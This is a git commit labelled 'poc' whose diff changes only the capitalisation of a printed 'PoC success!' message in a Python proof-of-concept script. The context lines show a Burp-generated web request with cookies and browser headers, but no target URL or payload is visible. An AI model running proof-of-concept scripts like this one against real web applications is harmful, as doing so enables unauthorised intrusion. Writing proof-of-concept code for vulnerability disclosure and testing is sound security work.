ac03dba23a33a0b2bc5db27575f7416334be3dbb
lishuang <894597649@qq.com>
2020-07-14 15:51:51 +0800

    poc

--- File/poc.py
+++ File/poc.py
@@ -31,4 +31,4 @@ burp0_cookies = {"_ga": "GA1.1.1568878424.1591097661", "showSubNav_i": "off", "t
 burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
 requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
 
-print("Poc success!")
+print("PoC success!")
